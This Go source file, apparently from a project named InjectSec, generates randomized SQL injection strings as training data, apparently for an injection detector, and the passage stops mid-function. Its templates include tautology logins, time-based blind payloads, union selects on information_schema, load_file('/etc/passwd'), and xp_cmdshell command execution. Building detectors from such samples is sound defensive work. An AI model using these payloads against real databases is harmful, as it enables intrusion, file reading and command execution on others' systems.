// Copyright 2018 The InjectSec Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

package main

import (
	"fmt"
	"math/rand"
	"strconv"
)

// Generator generates training data
type Generator struct {
	Form string
	Make func() (sample string)
}

// TrainingDataGenerator returns a data generator
func TrainingDataGenerator(rnd *rand.Rand) []Generator {
	sampleHexSpaces := func() string {
		sample, count := "", rnd.Intn(5)+1
		for i := 0; i < count; i++ {
			sample += "%20"
		}
		return sample
	}
	sampleSpaces := func() string {
		sample, count := "", rnd.Intn(5)+1
		for i := 0; i < count; i++ {
			sample += " "
		}
		return sample
	}
	sampleOr := func() string {
		if rnd.Intn(2) == 0 {
			return "or"
		}
		return "||"
	}
	sampleAnd := func() string {
		if rnd.Intn(2) == 0 {
			return "and"
		}
		return "&&"
	}
	sampleName := func() string {
		sample, count := "", rand.Intn(8)+1
		for i := 0; i < count; i++ {
			sample += string(rune(int('a') + rnd.Intn(int('z'-'a'))))
		}
		return sample
	}
	sampleNumber := func(a int) string {
		return strconv.Itoa(rand.Intn(a))
	}
	sampleHex := func(a int) string {
		return fmt.Sprintf("%#x", rnd.Intn(a))
	}

	sampleBenchmark := func() (sample string) {
		sample += "benchmark("
		sample += sampleNumber(10000000)
		sample += ",MD5("
		sample += sampleNumber(10000000)
		sample += "))#"
		return
	}
	generators := []Generator{
		// Generic-SQLi.txt
		{
			Form: ")%20or%20('x'='x",
			Make: func() (sample string) {
				sample += ")"
				sample += sampleHexSpaces()
				sample += sampleOr()
				sample += sampleHexSpaces()
				sample += "('"
				name := sampleName()
				sample += name
				sample += "'='"
				sample += name
				return
			},
		},
		{
			Form: "%20or%201=1",
			Make: func() (sample string) {
				sample += sampleHexSpaces()
				sample += sampleOr()
				sample += sampleHexSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				return
			},
		},
		{
			Form: "; execute immediate 'sel' || 'ect us' || 'er'",
			Make: func() (sample string) {
				sample += "; execute immediate '"
				concat := "select " + sampleName()
				for _, v := range concat {
					sample += string(v)
					if rnd.Intn(3) == 0 {
						sample += "' || '"
					}
				}
				sample += "'"
				return
			},
		},
		{
			Form: "benchmark(10000000,MD5(1))#",
			Make: func() (sample string) {
				sample += sampleBenchmark()
				return
			},
		},
		{
			Form: "update",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "update"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "\";waitfor delay '0:0:__TIME__'--",
			Make: func() (sample string) {
				sample += "\";waitfor"
				sample += sampleSpaces()
				sample += "delay"
				sample += sampleSpaces()
				sample += "'"
				sample += sampleNumber(24)
				sample += ":"
				sample += sampleNumber(60)
				sample += ":"
				sample += sampleNumber(60)
				sample += "'--"
				return
			},
		},
		{
			Form: "1) or pg_sleep(__TIME__)--",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += ")"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "pg_sleep("
				sample += sampleNumber(1337)
				sample += ")--"
				return
			},
		},
		{
			Form: "||(elt(-3+5,bin(15),ord(10),hex(char(45))))",
			Make: func() (sample string) {
				sample += sampleOr()
				sample += "(elt("
				sample += sampleNumber(1337)
				sample += ",bin("
				sample += sampleNumber(1337)
				sample += "),ord("
				sample += sampleNumber(10)
				sample += "),hex(char("
				sample += sampleNumber(256)
				sample += "))))"
				return
			},
		},
		{
			Form: "\"hi\"\") or (\"\"a\"\"=\"\"a\"",
			Make: func() (sample string) {
				sample += "\""
				sample += sampleName()
				sample += "\"\")"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "(\"\""
				name := sampleName()
				sample += name
				sample += "\"\"=\"\""
				sample += name
				sample += "\""
				return
			},
		},
		{
			Form: "delete",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "delete"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "like",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "like"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "\" or sleep(__TIME__)#",
			Make: func() (sample string) {
				sample += "\""
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "sleep("
				sample += sampleNumber(1337)
				sample += ")#"
				return
			},
		},
		{
			Form: "pg_sleep(__TIME__)--",
			Make: func() (sample string) {
				sample += "pg_sleep("
				sample += sampleNumber(1337)
				sample += ")--"
				return
			},
		},
		{
			Form: "*(|(objectclass=*))",
		},
		{
			Form: "declare @q nvarchar (200) 0x730065006c00650063 ...",
			Make: func() (sample string) {
				sample += "declare"
				sample += sampleSpaces()
				sample += "@"
				sample += sampleName()
				sample += sampleSpaces()
				sample += "nvarchar"
				sample += sampleSpaces()
				sample += "("
				sample += sampleNumber(1337)
				sample += ")"
				sample += sampleSpaces()
				sample += sampleHex(1337 * 1337)
				return
			},
		},
		{
			Form: " or 0=0 #",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += sampleSpaces()
				sample += "#"
				return
			},
		},
		{
			Form: "insert",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "insert"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "1) or sleep(__TIME__)#",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += ")"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "sleep("
				sample += sampleNumber(1337)
				sample += ")#"
				return
			},
		},
		{
			Form: ") or ('a'='a",
			Make: func() (sample string) {
				sample += ")"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "('"
				name := sampleName()
				sample += name
				sample += "'='"
				sample += name
				return
			},
		},
		{
			Form: "; exec xp_regread",
			Make: func() (sample string) {
				sample += ";"
				sample += sampleSpaces()
				sample += "exec"
				sample += sampleSpaces()
				sample += "xp_regread"
				return
			},
		},
		{
			Form: "*|",
		},
		{
			Form: "@var select @var as var into temp end --",
			Make: func() (sample string) {
				sample += "@"
				name := sampleName()
				sample += name
				sample += sampleSpaces()
				sample += "select"
				sample += sampleSpaces()
				sample += "@"
				sample += name
				sample += sampleSpaces()
				sample += "as"
				sample += sampleSpaces()
				sample += name
				sample += sampleSpaces()
				sample += "into"
				sample += sampleSpaces()
				sample += sampleName()
				sample += sampleSpaces()
				sample += "end"
				sample += sampleSpaces()
				sample += "--"
				return
			},
		},
		{
			Form: "1)) or benchmark(10000000,MD5(1))#",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += "))"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += sampleBenchmark()
				return
			},
		},
		{
			Form: "asc",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "asc"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "(||6)",
			Make: func() (sample string) {
				sample += "(||"
				sample += sampleNumber(1337)
				sample += ")"
				return
			},
		},
		{
			Form: "\"a\"\" or 3=3--\"",
			Make: func() (sample string) {
				sample += "\""
				sample += sampleName()
				sample += "\"\""
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += "--\""
				return
			},
		},
		{
			Form: "\" or benchmark(10000000,MD5(1))#",
			Make: func() (sample string) {
				sample += "\""
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += sampleBenchmark()
				return
			},
		},
		{
			Form: "# from wapiti",
			Make: func() (sample string) {
				sample += "#"
				sample += sampleSpaces()
				sample += "from"
				sample += sampleSpaces()
				sample += "wapiti"
				return
			},
		},
		{
			Form: " or 0=0 --",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += sampleSpaces()
				sample += "--"
				return
			},
		},
		{
			Form: "1 waitfor delay '0:0:10'--",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += "waitfor"
				sample += sampleSpaces()
				sample += "delay"
				sample += sampleSpaces()
				sample += "'"
				sample += sampleNumber(24)
				sample += ":"
				sample += sampleNumber(60)
				sample += ":"
				sample += sampleNumber(60)
				sample += "'--"
				return
			},
		},
		{
			Form: " or 'a'='a",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "'"
				name := sampleName()
				sample += name
				sample += "'='"
				sample += name
				return
			},
		},
		{
			Form: "hi or 1=1 --\"",
			Make: func() (sample string) {
				sample += sampleName()
				sample += sampleSpaces()
				sample += sampleOr()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += sampleSpaces()
				sample += "--\""
				return
			},
		},
		{
			Form: "or a = a",
			Make: func() (sample string) {
				sample += sampleOr()
				sample += sampleSpaces()
				name := sampleName()
				sample += name
				sample += sampleSpaces()
				sample += "="
				sample += sampleSpaces()
				sample += name
				return
			},
		},
		{
			Form: " UNION ALL SELECT",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "union"
				sample += sampleSpaces()
				sample += "all"
				sample += sampleSpaces()
				sample += "select"
				return
			},
		},
		{
			Form: ") or sleep(__TIME__)='",
			Make: func() (sample string) {
				sample += ")"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "sleep("
				sample += sampleNumber(1337)
				sample += ")='"
				return
			},
		},
		{
			Form: ")) or benchmark(10000000,MD5(1))#",
			Make: func() (sample string) {
				sample += "))"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += sampleBenchmark()
				sample += "#"
				return
			},
		},
		{
			Form: "hi' or 'a'='a",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "'"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "'"
				name := sampleName()
				sample += name
				sample += "'='"
				sample += name
				return
			},
		},
		{
			Form: "0",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				return
			},
		},
		{
			Form: "21 %",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += "%"
				return
			},
		},
		{
			Form: "limit",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "limit"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: " or 1=1",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				return
			},
		},
		{
			Form: " or 2 > 1",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += sampleSpaces()
				sample += ">"
				sample += sampleSpaces()
				max, err := strconv.Atoi(number)
				if err != nil {
					panic(err)
				}
				sample += sampleNumber(max)
				return
			},
		},
		{
			Form: "\")) or benchmark(10000000,MD5(1))#",
			Make: func() (sample string) {
				sample += "\"))"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += sampleBenchmark()
				sample += "#"
				return
			},
		},
		{
			Form: "PRINT",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "print"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "hi') or ('a'='a",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "')"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "('"
				name := sampleName()
				sample += name
				sample += "'='"
				sample += name
				return
			},
		},
		{
			Form: " or 3=3",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				return
			},
		},
		{
			Form: "));waitfor delay '0:0:__TIME__'--",
			Make: func() (sample string) {
				sample += "));waitfor"
				sample += sampleSpaces()
				sample += "delay"
				sample += sampleSpaces()
				sample += "'"
				sample += sampleNumber(24)
				sample += ":"
				sample += sampleNumber(60)
				sample += ":"
				sample += sampleNumber(60)
				sample += "'--'"
				return
			},
		},
		{
			Form: "a' waitfor delay '0:0:10'--",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "'"
				sample += sampleSpaces()
				sample += "waitfor"
				sample += sampleSpaces()
				sample += "delay"
				sample += sampleSpaces()
				sample += "'"
				sample += sampleNumber(24)
				sample += ":"
				sample += sampleNumber(60)
				sample += ":"
				sample += sampleNumber(60)
				sample += "'--"
				return
			},
		},
		{
			Form: "1;(load_file(char(47,101,116,99,47,112,97,115, ...",
			Make: func() (sample string) {
				sample += sampleNumber(256)
				sample += ";(load_file(char("
				for i := 0; i < 7; i++ {
					sample += sampleNumber(256)
					sample += ","
				}
				sample += sampleNumber(256)
				sample += ")))"
				return
			},
		},
		{
			Form: "or%201=1",
			Make: func() (sample string) {
				sample += sampleOr()
				sample += sampleHexSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				return
			},
		},
		{
			Form: "1 or sleep(__TIME__)#",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "sleep("
				sample += sampleNumber(1337)
				sample += ")#"
				return
			},
		},
		{
			Form: "or 1=1",
			Make: func() (sample string) {
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				return
			},
		},
		{
			Form: " and 1 in (select var from temp)--",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleAnd()
				sample += sampleSpaces()
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += "in"
				sample += sampleSpaces()
				sample += "(select"
				sample += sampleSpaces()
				sample += sampleName()
				sample += sampleSpaces()
				sample += "from"
				sample += sampleSpaces()
				sample += sampleName()
				sample += ")--"
				return
			},
		},
		{
			Form: " or '7659'='7659",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "'"
				number := sampleNumber(1337)
				sample += number
				sample += "'='"
				sample += number
				return
			},
		},
		{
			Form: " or 'text' = n'text'",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "'"
				name := sampleName()
				sample += name
				sample += "'"
				sample += sampleSpaces()
				sample += "="
				sample += sampleSpaces()
				sample += "n'"
				sample += name
				sample += "'"
				return
			},
		},
		{
			Form: " --",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "--"
				return
			},
		},
		{
			Form: " or 1=1 or ''='",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "''='"
				return
			},
		},
		{
			Form: "declare @s varchar (200) select @s = 0x73656c6 ...",
			Make: func() (sample string) {
				sample += "declare"
				sample += sampleSpaces()
				sample += "@"
				name := sampleName()
				sample += name
				sample += sampleSpaces()
				sample += "varchar"
				sample += sampleSpaces()
				sample += "("
				sample += sampleNumber(200)
				sample += ")"
				sample += sampleSpaces()
				sample += "select"
				sample += sampleSpaces()
				sample += "@"
				sample += name
				sample += sampleSpaces()
				sample += "="
				sample += sampleSpaces()
				sample += sampleHex(1337 * 1337)
				return
			},
		},
		{
			Form: "exec xp",
			Make: func() (sample string) {
				sample += "exec"
				sample += sampleSpaces()
				sample += sampleName()
				return
			},
		},
		{
			Form: "; exec master..xp_cmdshell 'ping 172.10.1.255'--",
			Make: func() (sample string) {
				sample += ";"
				sample += sampleSpaces()
				sample += "exec"
				sample += sampleSpaces()
				sample += "master..xp_cmdshell"
				sample += sampleSpaces()
				sample += "'ping"
				sample += sampleSpaces()
				sample += sampleNumber(256)
				sample += "."
				sample += sampleNumber(256)
				sample += "."
				sample += sampleNumber(256)
				sample += "."
				sample += sampleNumber(256)
				sample += "'--"
				return
			},
		},
		{
			Form: "3.10E+17",
			Make: func() (sample string) {
				const factor = 1337 * 1337
				sample += fmt.Sprintf("%E", rnd.Float64()*factor-factor/2)
				return
			},
		},
		{
			Form: "\" or pg_sleep(__TIME__)--",
			Make: func() (sample string) {
				sample += "\""
				sample += sampleSpaces()
				sample += sampleOr()
				sample += "pg_sleep("
				sample += sampleNumber(1337)
				sample += ")--"
				return
			},
		},
		{
			Form: "x' AND email IS NULL; --",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "'"
				sample += sampleSpaces()
				sample += sampleAnd()
				sample += sampleSpaces()
				sample += sampleName()
				sample += sampleSpaces()
				sample += "is"
				sample += sampleSpaces()
				sample += "null;"
				sample += sampleSpaces()
				sample += "--"
				return
			},
		},
		{
			Form: "&",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "&"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "admin' or '",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "'"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "'"
				return
			},
		},
		{
			Form: " or 'unusual' = 'unusual'",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "'"
				name := sampleName()
				sample += "'"
				sample += sampleSpaces()
				sample += "="
				sample += sampleSpaces()
				sample += "'"
				sample += name
				sample += "'"
				return
			},
		},
		{
			Form: "//",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "//"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "truncate",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "truncate"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "1) or benchmark(10000000,MD5(1))#",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += ")"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += sampleBenchmark()
				sample += "#"
				return
			},
		},
		{
			Form: "\x27UNION SELECT",
			Make: func() (sample string) {
				sample += "\x27union"
				sample += sampleSpaces()
				sample += "select"
				return
			},
		},
		{
			Form: "declare @s varchar(200) select @s = 0x77616974 ...",
			Make: func() (sample string) {
				sample += "declare"
				sample += sampleSpaces()
				sample += "@"
				name := sampleName()
				sample += name
				sample += sampleSpaces()
				sample += "varchar("
				sample += sampleNumber(200)
				sample += ")"
				sample += sampleSpaces()
				sample += "select"
				sample += sampleSpaces()
				sample += "@"
				sample += name
				sample += sampleSpaces()
				sample += "="
				sample += sampleSpaces()
				sample += sampleHex(1337 * 1337)
				return
			},
		},
		{
			Form: "tz_offset",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "tz_offset"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "sqlvuln",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "sqlvuln"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "\"));waitfor delay '0:0:__TIME__'--",
			Make: func() (sample string) {
				sample += "\"));waitfor"
				sample += sampleSpaces()
				sample += "delay"
				sample += sampleSpaces()
				sample += "'"
				sample += sampleNumber(24)
				sample += ":"
				sample += sampleNumber(60)
				sample += ":"
				sample += sampleNumber(60)
				sample += "'--"
				return
			},
		},
		{
			Form: "||6",
			Make: func() (sample string) {
				sample += sampleOr()
				sample += sampleNumber(1337)
				return
			},
		},
		{
			Form: "or%201=1 --",
			Make: func() (sample string) {
				sample += sampleOr()
				sample += sampleHexSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += sampleSpaces()
				sample += "--"
				return
			},
		},
		{
			Form: "%2A%28%7C%28objectclass%3D%2A%29%29",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "%2A%28%7C%28objectclass%3D%2A%29%29"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "or a=a",
			Make: func() (sample string) {
				sample += sampleOr()
				sample += sampleSpaces()
				name := sampleName()
				sample += name
				sample += "="
				sample += name
				return
			},
		},
		{
			Form: ") union select * from information_schema.tables;",
			Make: func() (sample string) {
				sample += ")"
				sample += sampleSpaces()
				sample += "union"
				sample += sampleSpaces()
				sample += "select"
				sample += sampleSpaces()
				sample += "*"
				sample += sampleSpaces()
				sample += "form"
				sample += sampleSpaces()
				sample += "information_schema.tables;"
				return
			},
		},
		{
			Form: "PRINT @@variable",
			Make: func() (sample string) {
				sample += "print"
				sample += sampleSpaces()
				sample += "@@"
				sample += sampleName()
				return
			},
		},
		{
			Form: "or isNULL(1/0) /*",
			Make: func() (sample string) {
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "isnull("
				sample += sampleNumber(1337)
				sample += "/0)"
				sample += sampleSpaces()
				sample += "/*"
				return
			},
		},
		{
			Form: "26 %",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += "%"
				return
			},
		},
		{
			Form: "\" or \"a\"=\"a",
			Make: func() (sample string) {
				sample += "\""
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "\""
				name := sampleName()
				sample += name
				sample += "\"=\""
				sample += name
				return
			},
		},
		{
			Form: "(sqlvuln)",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "(sqlvuln)"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "x' AND members.email IS NULL; --",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "'"
				sample += sampleSpaces()
				sample += sampleAnd()
				sample += sampleSpaces()
				sample += "members.email"
				sample += sampleSpaces()
				sample += "is"
				sample += sampleSpaces()
				sample += "null;"
				sample += sampleSpaces()
				sample += "--"
				return
			},
		},
		{
			Form: " or 1=1--",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += "--"
				return
			},
		},
		{
			Form: " and 1=( if((load_file(char(110,46,101,120,11 ...",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleAnd()
				sample += sampleSpaces()
				sample += sampleNumber(1337)
				sample += "=("
				sample += sampleSpaces()
				sample += "if((load_file(char("
				for i := 0; i < 7; i++ {
					sample += sampleNumber(256)
					sample += ","
				}
				sample += sampleNumber(256)
				sample += ")))))"
				return
			},
		},
		{
			Form: "0x770061006900740066006F0072002000640065006C00 ...",
			Make: func() (sample string) {
				sample += sampleHex(1337 * 1337)
				return
			},
		},
		{
			Form: "%20'sleep%2050'",
			Make: func() (sample string) {
				sample += sampleHexSpaces()
				sample += "'sleep"
				sample += sampleHexSpaces()
				sample += sampleNumber(1337)
				return
			},
		},
		{
			Form: "as",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "as"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: "1)) or pg_sleep(__TIME__)--",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "pg_sleep("
				sample += sampleNumber(1337)
				sample += ")--"
				return
			},
		},
		{
			Form: "/**/or/**/1/**/=/**/1",
			Make: func() (sample string) {
				sampleComment := func() string {
					s := "/*"
					s += sampleName()
					s += "*/"
					return s
				}
				sample += sampleComment()
				sample += sampleOr()
				sample += sampleComment()
				number := sampleNumber(1337)
				sample += number
				sample += sampleComment()
				sample += "="
				sample += sampleComment()
				sample += number
				return
			},
		},
		{
			Form: " union all select @@version--",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "union"
				sample += sampleSpaces()
				sample += "all"
				sample += sampleSpaces()
				sample += "select"
				sample += sampleSpaces()
				sample += "@@"
				sample += sampleName()
				sample += "--"
				return
			},
		},
		{
			Form: ",@variable",
			Make: func() (sample string) {
				sample += ",@"
				sample += sampleName()
				return
			},
		},
		{
			Form: "(sqlattempt2)",
		},
		{
			Form: " or (EXISTS)",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "(exists)"
				return
			},
		},
		{
			Form: "t'exec master..xp_cmdshell 'nslookup www.googl ...",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "'exec"
				sample += sampleSpaces()
				sample += "master..xp_cmdshell"
				sample += sampleSpaces()
				sample += "'nslookup"
				sample += sampleSpaces()
				sample += sampleName()
				sample += "."
				sample += sampleName()
				sample += "."
				sample += sampleName()
				sample += "'"
				return
			},
		},
		{
			Form: "%20$(sleep%2050)",
			Make: func() (sample string) {
				sample += sampleHexSpaces()
				sample += "$(sleep"
				sample += sampleHexSpaces()
				sample += sampleNumber(1337)
				sample += ")"
				return
			},
		},
		{
			Form: "1 or benchmark(10000000,MD5(1))#",
			Make: func() (sample string) {
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += sampleBenchmark()
				sample += "#"
				return
			},
		},
		{
			Form: "%20or%20''='",
			Make: func() (sample string) {
				sample += sampleHexSpaces()
				sample += sampleOr()
				sample += sampleHexSpaces()
				sample += "''='"
				return
			},
		},
		{
			Form: "||UTL_HTTP.REQUEST",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += "utl_http.request"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: " or pg_sleep(__TIME__)--",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "pg_sleep("
				sample += sampleNumber(1337)
				sample += ")--"
				return
			},
		},
		{
			Form: "hi' or 'x'='x';",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "'"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "'"
				name := sampleName()
				sample += name
				sample += "'='"
				sample += name
				sample += "';"
				return
			},
		},
		{
			Form: "\") or sleep(__TIME__)=\"",
			Make: func() (sample string) {
				sample += "\")"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "sleep("
				sample += sampleNumber(1337)
				sample += ")=\""
				return
			},
		},
		{
			Form: " or 'whatever' in ('whatever')",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "'"
				name := sampleName()
				sample += name
				sample += "'"
				sample += sampleSpaces()
				sample += "in"
				sample += sampleSpaces()
				sample += "('"
				sample += name
				sample += "')"
				return
			},
		},
		{
			Form: "; begin declare @var varchar(8000) set @var=' ...",
			Make: func() (sample string) {
				sample += ";"
				sample += sampleSpaces()
				sample += "begin"
				sample += sampleSpaces()
				sample += "declare"
				sample += sampleSpaces()
				sample += "@"
				name := sampleName()
				sample += name
				sample += sampleSpaces()
				sample += "varchar("
				sample += sampleNumber(8000)
				sample += ")"
				sample += sampleSpaces()
				sample += "set"
				sample += sampleSpaces()
				sample += "@"
				sample += name
				sample += "='"
				sample += sampleName()
				sample += "'"
				return
			},
		},
		{
			Form: " union select 1,load_file('/etc/passwd'),1,1,1;",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "union"
				sample += sampleSpaces()
				sample += "select"
				sample += sampleSpaces()
				sample += sampleNumber(1337)
				sample += ",load_file('/etc/passwd')"
				for i := 0; i < 3; i++ {
					sample += ","
					sample += sampleNumber(1337)
				}
				sample += ";"
				return
			},
		},
		{
			Form: "0x77616974666F722064656C61792027303A303A313027 ...",
			Make: func() (sample string) {
				sample += sampleHex(1337 * 1337)
				return
			},
		},
		{
			Form: "exec(@s)",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "exec(@"
				sample += sampleName()
				sample += ")"
				sample += sampleSpaces()
				return
			},
		},
		{
			Form: ") or pg_sleep(__TIME__)--",
			Make: func() (sample string) {
				sample += ")"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "pg_sleep("
				sample += sampleNumber(1337)
				sample += ")--"
				return
			},
		},
		{
			Form: " union select",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "union"
				sample += sampleSpaces()
				sample += "select"
				return
			},
		},
		{
			Form: " or sleep(__TIME__)#",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "sleep("
				sample += sampleNumber(1337)
				sample += ")#"
				return
			},
		},
		{
			Form: " select * from information_schema.tables--",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += "select"
				sample += sampleSpaces()
				sample += "*"
				sample += sampleSpaces()
				sample += "from"
				sample += sampleSpaces()
				sample += "information_schema.tables--"
				return
			},
		},
		{
			Form: "a' or 1=1--",
			Make: func() (sample string) {
				sample += sampleName()
				sample += "'"
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				number := sampleNumber(1337)
				sample += number
				sample += "="
				sample += number
				sample += "--"
				return
			},
		},
		{
			Form: "a' or 'a' = 'a",
			Make: func() (sample string) {
				sample += sampleName()
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += "'"
				name := sampleName()
				sample += name
				sample += "'"
				sample += sampleSpaces()
				sample += "="
				sample += sampleSpaces()
				sample += "'"
				sample += name
				return
			},
		},
		{
			Form: "declare @s varchar(22) select @s =",
			Make: func() (sample string) {
				sample += "declare"
				sample += sampleSpaces()
				sample += "@"
				name := sampleName()
				sample += name
				sample += sampleSpaces()
				sample += "varchar("
				sample += sampleNumber(22)
				sample += ")"
				sample += sampleSpaces()
				sample += "select"
				sample += sampleSpaces()
				sample += "@"
				sample += name
				sample += sampleSpaces()
				sample += "="
				return
			},
		},
		{
			Form: " or 2 between 1 and 3",
			Make: func() (sample string) {
				sample += sampleSpaces()
				sample += sampleOr()
				sample += sampleSpaces()
				sample += sampleNumber(1337)
				sample += sampleSpaces()
				sample += "between"
